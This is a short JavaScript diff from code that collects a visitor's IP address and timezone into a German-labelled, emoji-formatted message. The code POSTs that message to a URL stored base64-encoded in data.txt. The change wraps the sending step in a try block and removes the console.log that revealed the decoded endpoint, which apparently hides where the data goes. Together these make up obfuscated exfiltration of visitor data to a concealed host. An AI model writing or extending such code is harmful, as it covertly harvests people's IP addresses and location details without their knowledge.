@@ -114,12 +114,12 @@
                     `🕓 **Zeitzone:** ${info.timezone}\n` +
                     `📡 **IP:** ${info.ip}\n` +
                     `\n-`;
-                
+
+                try {
                   const fileResponse = await fetch("data.txt");
                   const text = await fileResponse.text();
                   const firstLine = text.split("\n")[0].trim();
                   const wU = atob(firstLine);
-                  console.log(wU);
                   const response = await fetch(wU, {
                       method: "POST",
                       headers: {
